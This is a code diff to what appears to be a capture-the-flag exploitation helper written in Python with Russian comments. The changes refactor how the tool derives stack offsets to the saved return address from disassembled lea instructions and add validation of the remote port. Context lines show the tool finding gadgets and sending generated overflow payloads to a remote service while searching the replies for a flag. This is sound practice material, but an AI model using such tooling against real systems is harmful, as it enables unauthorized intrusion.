@@ -31,6 +31,7 @@ import argparse
 import importlib.util
 import json
 import os
+import re
 import socket
 import struct
 import subprocess
@@ -93,6 +94,21 @@ def find_gadgets(data, is64):
     return gadgets
 
 
+_LEA_RX = re.compile(r"[a-z0-9]+,\[(?:rbp|rsp)([+-])(0x[0-9a-f]+|\d+)\]")
+
+
+def _lea_disp(op: str):
+    """Смещение из "rdi,[rbp-0x40]" (знак учитывается). None — если не разобралось."""
+    m = _LEA_RX.search(op)
+    if not m:
+        return None
+    try:
+        val = int(m.group(2), 0)
+    except ValueError:
+        return None
+    return -val if m.group(1) == "-" else val
+
+
 def find_offsets(data, is64, symbols):
     """Кандидаты смещения до saved RIP из дизассемблера уязвимых функций."""
     try:
@@ -119,14 +135,13 @@ def find_offsets(data, is64, symbols):
             code = data[off + (start - addr):off + (start - addr) + 400]
             for ins in md.disasm(code, start):
                 op = ins.op_str.replace(" ", "").lower()
-                if ins.mnemonic == "lea" and op.startswith(("rdi,[rbp-", "rdi,[rsp+")):
-                    try:
-                        disp = int(op.split(",")[1].split("-")[1], 0) if "-" in op \
-                            else int(op.split("+")[1], 0)
-                    except (ValueError, IndexError):
+                if ins.mnemonic == "lea" and (",[rbp" in op or ",[rsp" in op):
+                    disp = _lea_disp(op)
+                    if disp is None:
                         continue
-                    out.append({"func": name, "how": f"lea rdi, {op.split(',')[1]}",
-                                "offset": disp + 8})
+                    out.append({"func": name,
+                                "how": "lea rdi, " + op.split(",", 1)[1],
+                                "offset": abs(disp) + 8})
                 elif ins.mnemonic == "sub" and op.startswith("rsp,"):
                     try:
                         n = int(op.split(",")[1], 0)
@@ -330,11 +345,18 @@ def main():
     best = r["payloads"][0]
     if args.remote:
         host, _, port = args.remote.partition(":")
-        import re
+        try:
+            port_n = int(port)
+        except ValueError:
+            print(f"[-] --remote: порт должен быть числом, получено {port!r}")
+            return 2
+        if not (1 <= port_n <= 65535):
+            print(f"[-] --remote: порт вне 1..65535 ({port_n})")
+            return 2
         flag_rx = re.compile(r"[A-Za-z0-9_]{2,20}\{[\x20-\x7e]{3,80}\}")
         print(f"[i] отправляю payload на {host}:{port}")
         for pl in r["payloads"][:4]:
-            out = run_remote(host, int(port or 0), pl["hex"])
+            out = run_remote(host, port_n, pl["hex"])
             m = flag_rx.search(out or "")
             tail = " ".join((out or "").strip().splitlines()[-2:])[:120]
             print(f"    offset {pl['offset']}: {tail or 'пусто'}")
